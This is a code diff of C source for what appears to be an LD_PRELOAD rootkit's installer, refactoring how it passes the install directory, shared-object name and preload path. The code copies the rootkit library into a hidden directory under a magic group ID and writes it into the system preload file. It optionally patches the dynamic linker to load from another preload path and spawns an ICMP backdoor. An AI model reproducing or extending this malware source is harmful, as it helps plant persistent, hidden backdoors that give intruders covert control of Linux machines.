@@ -1,9 +1,9 @@
-void bignope(int p){
+void bignope(char *installdir, int p){
 #ifdef PATCH_DYNAMIC_LINKER
     if(p) // ...
         ldpatch(PRELOAD_FILE, OLD_PRELOAD);
 #endif
-    eradicatedir(INSTALL_DIR);
+    eradicatedir(installdir);
     exit(0);
 }
 
@@ -47,7 +47,7 @@ int chkselinux(void){
     return badselinux;
 }
 
-void bdvinstall(char *const argv[]){
+void bdvinstall(char *const argv[], char *installdir, char *bdvlso, char *preloadpath, gid_t magicgid){
     dorolf();
 
     int selinux = anselinux();
@@ -69,26 +69,24 @@ void bdvinstall(char *const argv[]){
         fedora=1;
 
     printf("Creating installation directory.\n");
-
-    gid_t magicgid = readgid();
-    if(preparedir(INSTALL_DIR, magicgid) < 0){
+    if(preparedir(installdir, magicgid) < 0){
         printf("Something went wrong creating the install directory.\n");
-        bignope(0);
+        bignope(installdir, 0);
     }
 
     char *opath, *odup, *npath;
-    int cpr, i;
+    int cpr, gotso=0;
 
-    for(i = 1; argv[i] != NULL; i++){
+    for(int i = 1; argv[i] != NULL; i++){
         if(strstr(argv[i], ".so.")){
             opath = argv[i];
             odup = strdup(opath);
-            npath = sogetpath(odup);
+            npath = sogetpath(odup, installdir, bdvlso);
             free(odup);
 
             if(npath == NULL){
-                printf("Could not get new path for %s.\n", opath);
-                bignope(0);
+                printf("Couldn't get new path for %s.\n", opath);
+                bignope(installdir, 0);
             }
 
             cpr = socopy(opath, npath, magicgid);
@@ -96,34 +94,46 @@ void bdvinstall(char *const argv[]){
             else{
                 printf("Something went wrong copying \e[1;31m%s\e[0m...\n", opath);
                 free(npath);
-                bignope(0);
+                bignope(installdir, 0);
             }
 
             if(fedora){
+                char *sopath = rksopath(installdir, bdvlso);
                 hook(CRENAME);
-                if((long)call(CRENAME, npath, PLAINSOPATH) < 0){
-                    printf("Rename failed: %s -> %s\n", npath, PLAINSOPATH);
+                if((long)call(CRENAME, npath, sopath) < 0){
+                    printf("Rename failed: %s -> %s\n", npath, sopath);
                     free(npath);
-                    bignope(0);
+                    free(sopath);
+                    bignope(installdir, 0);
                 }
+                free(sopath);
             }
 
             free(npath);
+            gotso++;
 
             if(fedora)
                 break;
-        }else bignope(0);
+        }
     }
 
-    if(rknomore()){
+    if(!gotso) bignope(installdir, 0);
+    if(rknomore(installdir, bdvlso)){
         printf("It seems something may have went wrong installing...\n");
-        bignope(0);
+        bignope(installdir, 0);
     }
 
-    char *preloadpath = OLD_PRELOAD;
+    reinstall(preloadpath, installdir, bdvlso);
+    if(!preloadok(preloadpath)){
+        printf("Something went wrong writing to %s\n", preloadpath);
+        bignope(installdir, 1);
+    }else printf("Installed.\n\n");
+
+    if(getgid() != 0) // assume this was an update...
+        return;
+
 #ifdef PATCH_DYNAMIC_LINKER
     printf("Patching dynamic linker.\n");
-    preloadpath = PRELOAD_FILE;
     int p=ldpatch(OLD_PRELOAD, preloadpath);
     if(p < 0){
         printf("Something has went horribly wrong...\n");
@@ -132,19 +142,13 @@ void bdvinstall(char *const argv[]){
         if(p == -3)
             printf("Failed allocating memory for ld.so paths.\n");
         // ...
-        bignope(0);
+        bignope(installdir, 0);
     }else if(p > 0) printf("Patched ld.so: \e[1;31m%d\e[0m\n", p);
     else{
         printf("Nothing to patch...?\n");
-        bignope(0);
+        bignope(installdir, 0);
     }
 #endif
-
-    reinstall(preloadpath);
-    if(!preloadok()){
-        printf("Something went wrong writing to %s\n", preloadpath);
-        bignope(1);
-    }else printf("Installed.\n\n");
 
 #ifdef USE_ICMP_BD
     spawnpdoor();
@@ -183,5 +187,4 @@ void bdvinstall(char *const argv[]){
 #ifdef BACKDOOR_UTIL
     printf("\nUnhappy with something?:\n  %s=1 sh -c './bdv uninstall'\n\n", BD_VAR);
 #endif
-    exit(0);
 }
